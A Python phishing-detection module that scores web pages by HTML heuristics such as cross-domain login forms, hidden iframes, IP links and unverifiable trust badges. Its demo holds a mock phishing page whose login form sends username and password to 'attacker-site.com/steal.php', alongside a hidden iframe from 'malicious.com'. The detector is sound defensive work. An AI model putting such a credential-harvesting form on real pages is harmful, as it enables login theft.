# TrueWeb - Module 8: HTML Content & Behavioral Analyzer
#
# Kết hợp:
# - Code 1: Right-click disable, cross-domain form, IP links, hidden inputs
# - Code 2: Null/external link ratio, login form detection, hidden iframes
#
# Tham khảo:
# [1] Zieni et al. 2023 - "Phishing or Not Phishing?..." (HTML-based features)
# [2] Li et al. 2024 - "A State-of-the-art Review..." (Source code & behavioral indicators)

from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from typing import Dict, Any
import re


# --- Heuristic penalties (trừ từ base 1.0) ---
# Đã điều chỉnh ngưỡng để giảm false positives cho website hợp lệ
HTML_SCORES = {
    "HIGH_NULL_LINK_RATIO": 0.20,        # > 40% null/broken links (tăng từ 30%)
    "HIGH_EXTERNAL_LINK_RATIO": 0.12,    # > 80% external links (tăng từ 60%, giảm penalty)
    "SENSITIVE_FORM_EXTERNAL": 0.30,     # form có password gửi ra domain khác
    "SENSITIVE_FORM_SUSPICIOUS": 0.20,   # form có password nhưng action rỗng/# ...
    "HIDDEN_IFRAME_SUSPICIOUS": 0.15,    # iframe ẩn từ domain lạ (giảm từ 0.20)
    "RIGHT_CLICK_DISABLED": 0.15,        # oncontextmenu (giảm từ 0.20)
    "IP_ADDRESS_LINKS": 0.20,            # anchor trỏ tới IP
    "MANY_HIDDEN_INPUTS": 0.08,          # > 15 hidden input (tăng từ 5, giảm penalty)
    "SUSPICIOUS_TRUST_BADGE": 0.12,      # badge/seal không verify được (giảm từ 0.15)
    "NO_HTML_CONTENT": 0.50,             # không phân tích được HTML
}


def check_html_heuristics(html_content: str, full_url: str) -> Dict[str, Any]:
    """
    Phân tích HTML content để tìm các chỉ số phishing (HTML + hành vi).

    Returns:
        {
            "sub_score": 0.0-1.0 (1.0 = rất sạch),
            "details": "...",
            "warnings": [...],
            "null_link_ratio": float,
            "external_link_ratio": float,
            "has_login_form": bool,
            "metrics": {
                "total_links": int,
                "null_links": int,
                "external_links": int,
                "forms": int,
                "hidden_inputs": int,
                "iframes": int,
                "hidden_iframes": int
            }
        }
    """
    report: Dict[str, Any] = {
        "sub_score": 1.0,
        "details": "HTML content appears normal.",
        "warnings": [],
        "null_link_ratio": 0.0,
        "external_link_ratio": 0.0,
        "has_login_form": False,
        "metrics": {
            "total_links": 0,
            "null_links": 0,
            "external_links": 0,
            "forms": 0,
            "hidden_inputs": 0,
            "iframes": 0,
            "hidden_iframes": 0,
            "trust_badges_detected": 0,
            "trust_badges_verified": 0,
            "trust_badges_suspicious": 0,
        },
    }

    # Debug: log input HTML size and preview
    try:
        print(f"[DEBUG] check_html_heuristics: received html_content length={len(html_content)} for URL={full_url}")
        if len(html_content) > 0:
            print(f"[DEBUG] HTML preview (first 300 chars): {html_content[:300].replace('\n', ' ')}")
    except Exception:
        # defensive: don't crash the analyzer when printing
        pass

    if not html_content:
        # Không có HTML để phân tích → giảm độ tin cậy một chút nhưng không kết luận xấu
        report["details"] = ["<b>ERROR:</b> No HTML content to analyze (request blocked, non-HTML, hoặc lỗi tải trang)."]
        report["sub_score"] = max(0.0, 1.0 - HTML_SCORES["NO_HTML_CONTENT"])
        return report

    try:
        soup = BeautifulSoup(html_content, "html.parser")
        parsed = urlparse(full_url)
        current_domain = parsed.netloc.lower()

        # Debug: report parse outcome
        try:
            parsed_html_len = len(str(soup))
            body_tag = bool(soup.find('body'))
            print(f"[DEBUG] Parsed HTML length={parsed_html_len}, body_present={body_tag}, current_domain={current_domain}")
        except Exception:
            pass

        # ---------------------------------------------------------------------
        # 1. Link analysis (null links + external links)
        #    Ref: Zieni 2023 - null/foreign domain ratio là feature quan trọng.
        # ---------------------------------------------------------------------
        all_links = soup.find_all("a", href=True)
        total_links = len(all_links)
        null_count = 0
        external_count = 0

        if total_links > 0:
            for tag in all_links:
                href = tag["href"].strip()

                # Null / broken / javascript links
                if (
                    href == ""
                    or href == "#"
                    or href.lower().startswith("javascript:void")
                ):
                    null_count += 1
                # External link (absolute URL có domain khác)
                elif href.lower().startswith("http"):
                    try:
                        link_domain = urlparse(href).netloc.lower()
                        if link_domain and link_domain != current_domain:
                            external_count += 1
                    except Exception:
                        # Nếu parse fail thì bỏ qua; không phạt thêm
                        pass

            report["metrics"]["total_links"] = total_links
            report["metrics"]["null_links"] = null_count
            report["metrics"]["external_links"] = external_count

            # Debug: link metrics
            print(f"[DEBUG] Links: total={total_links}, null={null_count}, external={external_count}")

            report["null_link_ratio"] = null_count / total_links
            report["external_link_ratio"] = external_count / total_links

            # Penalty: nhiều null/broken links (chỉ cảnh báo khi > 40%)
            if report["null_link_ratio"] > 0.4:
                report["warnings"].append(
                    f"High ratio of null/broken links ({report['null_link_ratio']:.1%})."
                )
                report["sub_score"] -= HTML_SCORES["HIGH_NULL_LINK_RATIO"]

            # Penalty: đa số link trỏ ra ngoài (chỉ cảnh báo khi > 80%)
            # Portal sites, Google, Wikipedia thường có nhiều external links hợp lệ
            if report["external_link_ratio"] > 0.8:
                report["warnings"].append(
                    f"Unusually high external links ({report['external_link_ratio']:.1%})."
                )
                report["sub_score"] -= HTML_SCORES["HIGH_EXTERNAL_LINK_RATIO"]

        # ---------------------------------------------------------------------
        # 2. Form analysis (login detection + cross-domain)
        #    Merge Code 1 + Code 2:
        #    - Có password field → login form
        #    - Action rỗng / '#' → suspicious
        #    - Action absolute URL ra domain khác (không phải subdomain) → high risk
        # ---------------------------------------------------------------------
        forms = soup.find_all("form")
        inputs = soup.find_all("input")
        report["metrics"]["forms"] = len(forms)

        has_password_field = any(
            (i.get("type") or "").lower() == "password" for i in inputs
        )

        if has_password_field:
            report["has_login_form"] = True
            suspicious_action_found = False
            external_action_found = False

            for form in forms:
                raw_action = form.get("action", "").strip()
                action = raw_action or ""  # tránh None

                if not action or action == "#":
                    # Form login mà action rỗng / '#' → rất đáng ngờ
                    suspicious_action_found = True
                    continue

                # Chuẩn hóa action thành URL đầy đủ rồi so domain
                full_action_url = urljoin(full_url, action)
                action_domain = urlparse(full_action_url).netloc.lower()

                if action_domain and action_domain != current_domain:
                    # Cho phép subdomain <-> main domain (login.paypal.com vs paypal.com)
                    is_subdomain = (
                        action_domain.endswith("." + current_domain)
                        or current_domain.endswith("." + action_domain)
                    )
                    if not is_subdomain:
                        external_action_found = True

            if external_action_found:
                report["warnings"].append(
                    "Login form posts credentials to external domain (cross-domain form submission)."
                )
                report["sub_score"] -= HTML_SCORES["SENSITIVE_FORM_EXTERNAL"]
            elif suspicious_action_found:
                report["warnings"].append(
                    "Login form detected with suspicious/empty action attribute."
                )
                report["sub_score"] -= HTML_SCORES["SENSITIVE_FORM_SUSPICIOUS"]

        # ---------------------------------------------------------------------
        # 3. Hidden inputs (có thể dùng để lén gửi thêm dữ liệu)
        #    Ref: Li 2024 - Source code indicators: nhiều hidden field bất thường.
        # ---------------------------------------------------------------------
        hidden_inputs = soup.find_all("input", {"type": "hidden"})
        hidden_count = len(hidden_inputs)
        report["metrics"]["hidden_inputs"] = hidden_count

        # Modern forms thường có CSRF tokens, session IDs, tracking → chỉ cảnh báo khi > 15
        if hidden_count > 15:
            report["warnings"].append(
                f"Suspiciously high number of hidden input fields ({hidden_count})."
            )
            report["sub_score"] -= HTML_SCORES["MANY_HIDDEN_INPUTS"]

        # Debug: form/input metrics
        try:
            total_inputs = len(inputs)
            print(f"[DEBUG] Forms: count={len(forms)}, total_inputs={total_inputs}, hidden_inputs={hidden_count}, has_password_field={has_password_field}")
        except Exception:
            pass

        # ---------------------------------------------------------------------
        # 4. Iframes (đặc biệt là iframe ẩn)
        #    Ref: Zieni 2023 - invisible content / cloaking.
        # ---------------------------------------------------------------------
        iframes = soup.find_all("iframe")
        report["metrics"]["iframes"] = len(iframes)

        hidden_iframe_detected = False
        for iframe in iframes:
            style = (iframe.get("style") or "").lower()
            width = (iframe.get("width") or "").strip()
            height = (iframe.get("height") or "").strip()

            # width/height đôi khi là số hoặc "0"
            is_zero_size = width in ("0", "0px") or height in ("0", "0px")
            is_hidden_style = "display:none" in style or "visibility:hidden" in style

            if is_zero_size or is_hidden_style:
                hidden_iframe_detected = True
                break

        if hidden_iframe_detected:
            report["metrics"]["hidden_iframes"] = 1
            
            # Check if iframe src is from known legitimate domains (analytics, ads, etc.)
            legitimate_iframe_domains = [
                "google.com", "googletagmanager.com", "google-analytics.com",
                "doubleclick.net", "facebook.com", "twitter.com", "youtube.com",
                "cloudflare.com", "jsdelivr.net", "unpkg.com"
            ]
            
            is_suspicious = True
            for iframe in iframes:
                src = (iframe.get("src") or "").lower()
                if any(domain in src for domain in legitimate_iframe_domains):
                    is_suspicious = False
                    break
            
            if is_suspicious:
                report["warnings"].append(
                    "Hidden iframe detected (possible cloaking/drive-by content)."
                )
                report["sub_score"] -= HTML_SCORES["HIDDEN_IFRAME_SUSPICIOUS"]

        # Debug: iframe metrics
        try:
            print(f"[DEBUG] Iframes: total={len(iframes)}, hidden_detected={report['metrics'].get('hidden_iframes', 0)}")
        except Exception:
            pass

        # ---------------------------------------------------------------------
        # 5. Behavioral indicator: disable right-click
        #    Ref: Li 2024 - anti-analysis / obfuscation techniques.
        # ---------------------------------------------------------------------
        html_lower = str(soup).lower()
        if 'oncontextmenu="return false"' in html_lower or "event.button==2" in html_lower:
            report["warnings"].append(
                "Right-click is disabled (anti-analysis / anti-user behavior)."
            )
            report["sub_score"] -= HTML_SCORES["RIGHT_CLICK_DISABLED"]

        # ---------------------------------------------------------------------
        # 6. Links pointing to IP addresses
        #    Ref: Zieni 2023 - IP-based URLs là feature phổ biến.
        # ---------------------------------------------------------------------
        ip_link_found = False
        ip_pattern = re.compile(
            r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", re.IGNORECASE
        )
        for tag in all_links:
            href = tag["href"]
            if ip_pattern.search(href):
                ip_link_found = True
                break

        if ip_link_found:
            report["warnings"].append(
                "Contains hyperlinks pointing directly to IP addresses."
            )
            report["sub_score"] -= HTML_SCORES["IP_ADDRESS_LINKS"]

        # ---------------------------------------------------------------------
        # 7. Trust badge / "certified by" seal checks (WEAK signal)
        #    Lưu ý: badge trên giao diện rất dễ bị copy/paste, nên chỉ coi như tín hiệu phụ.
        #    - Nếu badge/seal xuất hiện nhưng không có link kiểm chứng → đáng ngờ
        #    - Nếu có link nhưng domain không khớp nhà cung cấp seal → đáng ngờ
        # ---------------------------------------------------------------------
        badge_imgs = soup.find_all("img")
        badge_keywords = [
            # Generic “trustmark / certified / verified”
            "trustmark", "trust mark", "trust seal", "site seal", "security seal",
            "certified", "certification", "certificate", "verified", "validation",
            "secure checkout", "secure payment", "safe shopping", "buyer protection",
            "protected by", "secured by", "security verified", "privacy verified",
            "security certified", "privacy certified", "compliance",

            # Vietnam (Bộ Công Thương)
            "bocongthuong", "bo cong thuong", "bộ công thương",
            "online.gov.vn", "đã đăng ký", "da dang ky", "dang ky",
            "đã thông báo", "da thong bao", "thong bao", "thông báo",

            # DMCA
            "dmca", "dmca.com", "protected by dmca", "dmca protection",
            "dmca badge", "dmca certificate",

            # TRUSTe / TrustArc
            "truste", "trustarc", "powered by trustarc",
            "privacy seal", "privacy certified", "privacy verified",
            "privacy feedback", "dpf", "data privacy framework",

            # BBB
            "bbb", "better business bureau", "bbb accredited", "bbb accreditation",
            "bbb rating", "bbb seal", "bbb business profile", "bbb a+",

            # TrustedSite (also legacy McAfee Secure transition)
            "trustedsite", "trusted site", "trustedsite certified",
            "verified business", "business verified",
            "mcafee secure", "mcafeesecure", "mcafee secure trustmark",

            # Certificate Authority site-seals (global)
            # DigiCert / GeoTrust / Thawte
            "digicert", "digicert smart seal", "digicert secured",
            "geotrust", "truebusiness id", "truebusinessid", "geotrust seal",
            "thawte", "thawte seal",

            # Sectigo / Comodo / TrustLogo
            "sectigo", "comodo", "trustlogo", "trust logo", "sectigo trust seal",
            "comodo secure", "comodo ssl", "point to verify", "idauthority",

            # GlobalSign
            "globalsign", "gmo globalsign", "globalsign seal", "secure site seal",

            # Legacy Norton/Symantec wording (treat as suspicious unless verified to official domains)
            "norton secured", "norton secure", "symantec seal", "symantec secured",
        ]

        # allowlist domain theo từng loại badge (tối giản để tránh false-positive)
        expected_domains = {
            # Vietnam registry
            "bocongthuong": {"online.gov.vn"},
            "bo cong thuong": {"online.gov.vn"},
            "bộ công thương": {"online.gov.vn"},
            "online.gov.vn": {"online.gov.vn"},

            # DMCA: badge hợp lệ phải link về DMCA certificate/portal
            "dmca": {"dmca.com"},

            # TRUSTe / TrustArc: validation pages thường nằm trên truste/trustarc domains
            "truste": {"truste.com", "trustarc.com", "privacy.truste.com", "privacy.trustarc.com"},
            "trustarc": {"trustarc.com", "truste.com", "privacy.trustarc.com", "privacy.truste.com"},
            "powered by trustarc": {"trustarc.com", "truste.com", "privacy.trustarc.com", "privacy.truste.com"},

            # BBB: seal hợp lệ link về BBB profile
            "bbb": {"bbb.org"},
            "better business bureau": {"bbb.org"},
            "bbb accredited": {"bbb.org"},
            "bbb seal": {"bbb.org"},

            # TrustedSite (và legacy McAfee Secure redirect qua TrustedSite)
            "trustedsite": {"trustedsite.com"},
            "trusted site": {"trustedsite.com"},
            "mcafeesecure": {"trustedsite.com", "mcafeesecure.com"},
            "mcafee secure": {"trustedsite.com", "mcafeesecure.com"},

            # DigiCert / GeoTrust / Thawte site seals (CertCentral / Smart Seal)
            "digicert": {"digicert.com"},
            "geotrust": {"geotrust.com", "digicert.com"},
            "thawte": {"thawte.com", "digicert.com"},

            # Sectigo/Comodo TrustLogo
            "sectigo": {"sectigo.com", "trustlogo.com"},
            "comodo": {"sectigo.com", "trustlogo.com", "comodoca.com"},
            "trustlogo": {"trustlogo.com", "sectigo.com"},

            # GlobalSign
            "globalsign": {"globalsign.com"},
        }

        base_current_domain = current_domain.split(":")[0]

        suspicious_badges = 0
        verified_badges = 0
        detected_badges = 0

        def _text_of_badge(img_tag) -> str:
            parts = [
                img_tag.get("alt", ""),
                img_tag.get("title", ""),
                img_tag.get("src", ""),
            ]
            return " ".join([p for p in parts if p]).lower()

        def _matches_any(text: str) -> bool:
            return any(k in text for k in badge_keywords)

        for img in badge_imgs:
            t = _text_of_badge(img)
            if not t or not _matches_any(t):
                continue

            detected_badges += 1

            # tìm <a href=...> gần nhất bao quanh badge
            a_parent = img.find_parent("a", href=True)
            if not a_parent:
                suspicious_badges += 1
                continue

            href = (a_parent.get("href") or "").strip()
            if not href or href == "#":
                suspicious_badges += 1
                continue

            full_href = urljoin(full_url, href)
            href_domain = urlparse(full_href).netloc.lower().split(":")[0]

            # xác định "loại" badge để so expected domain
            badge_type = None
            for k in expected_domains.keys():
                if k in t:
                    badge_type = k
                    break

            if badge_type:
                if not any(href_domain.endswith(ed) for ed in expected_domains[badge_type]):
                    suspicious_badges += 1
                else:
                    verified_badges += 1
            else:
                # badge generic: nếu tự trỏ về cùng domain thì coi là "khó verify" → nghi ngờ nhẹ
                if href_domain == base_current_domain:
                    suspicious_badges += 1

        report["metrics"]["trust_badges_detected"] = detected_badges
        report["metrics"]["trust_badges_verified"] = verified_badges
        report["metrics"]["trust_badges_suspicious"] = suspicious_badges

        if suspicious_badges > 0:
            report["warnings"].append(
                f"Trust badge/seal detected but not verifiable or suspicious ({suspicious_badges}/{detected_badges})."
            )
            report["sub_score"] -= HTML_SCORES["SUSPICIOUS_TRUST_BADGE"]

        # ---------------------------------------------------------------------
        # Finalize - Convert to list format for GUI
        # ---------------------------------------------------------------------
        if report["warnings"]:
            report["details"] = [f"<b>WARNING:</b> {warning}" for warning in report["warnings"]]
        else:
            report["details"] = ["<b>Status:</b> HTML content appears normal (No obvious suspicious patterns)."]

        # Clamp score to [0.0, 1.0]
        report["sub_score"] = max(0.0, min(1.0, report["sub_score"]))

        # Debug: final score and warnings
        try:
            print(f"[DEBUG] Final HTML sub_score={report['sub_score']:.2f}, warnings_count={len(report.get('warnings', []))}")
        except Exception:
            print(f"[DEBUG] Final HTML sub_score (raw)={report.get('sub_score')}")

    except Exception as e:
        # Nếu parser/logic lỗi → không kết luận mạnh tay
        report["details"] = [f"<b>ERROR:</b> HTML analysis error: {str(e)}"]
        # Giữ sub_score gần trung tính
        report["sub_score"] = max(0.0, min(1.0, 0.6))

    return report


if __name__ == "__main__":
    # Demo nhanh
    print("--- Testing HTML Content & Behavioral Analyzer ---")
    mock_html = """
    <html>
      <body oncontextmenu="return false">
        <form action="http://attacker-site.com/steal.php">
          <input type="text" name="user">
          <input type="password" name="pass">
          <input type="hidden" name="h1">
          <input type="hidden" name="h2">
          <input type="hidden" name="h3">
          <input type="hidden" name="h4">
          <input type="hidden" name="h5">
          <input type="hidden" name="h6">
        </form>
        <a href="#">Menu</a>
        <a href="javascript:void(0)">Click</a>
        <a href="https://1.2.3.4/login">IP login</a>
        <a href="https://facebook.com/help">External link</a>
        <iframe src="http://malicious.com/ad.html" style="display:none" width="0" height="0"></iframe>
      </body>
    </html>
    """
    res = check_html_heuristics(mock_html, "https://legit-bank.com")
    import json
    print(json.dumps(res, indent=2))
